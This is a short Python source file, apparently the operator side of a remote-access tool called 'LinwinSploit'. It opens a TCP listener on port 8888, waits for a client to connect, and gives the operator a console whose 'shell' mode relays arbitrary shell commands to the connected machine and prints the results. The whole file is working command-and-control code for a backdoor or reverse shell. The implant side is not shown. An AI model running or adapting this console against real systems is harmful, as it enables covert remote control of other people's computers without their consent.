import socket
import os

print(" [INFO] WAIT FOR THE CLIENT CONNECT......")
tcpserver = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
tcpserver.bind(("", 8888))
tcpserver.listen(5)
while True:
    conn, addr = tcpserver.accept()
    print(conn)
    print(" Enter 'help' to get help information.")
    while True:
        try:

            command = input("LinwinSploit> ").strip()

            if command == 'exit':
                conn.send(command.encode())
                conn.close()
                exit(0)
            if command == 'help':
                runPath = os.path.abspath(os.path.dirname(__file__))
                o = open(runPath+"/Help.txt")
                print(o.read())
                continue
            if command == 'shell':
                while True:
                    try:
                        shell_command = input("LinwinSploit [Shell] $ ")
                        if shell_command == 'exit':
                            break

                        conn.send(("shell: "+shell_command).encode())
                        data = conn.recv(1024)
                        print(data.decode("utf-8"))
                    except KeyboardInterrupt:
                        continue
            else:
                conn.send(command.encode())
                ret = conn.recv(1024)
                client_message = ret.decode("utf-8")
                print(client_message)

        except Exception:
            break
    conn.close()